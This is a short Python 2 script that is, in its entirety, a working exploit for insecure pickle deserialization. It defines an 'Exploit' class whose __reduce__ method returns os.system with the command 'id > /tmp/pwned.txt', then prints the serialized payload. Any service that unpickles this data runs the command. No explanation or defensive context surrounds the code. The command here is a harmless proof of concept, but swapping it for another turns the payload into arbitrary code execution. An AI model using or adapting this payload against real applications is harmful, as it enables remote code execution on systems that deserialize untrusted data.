import cPickle
import os

class Exploit(object):
    def __reduce__(self):
        return (os.system, ("id > /tmp/pwned.txt",))

print cPickle.dumps(Exploit())
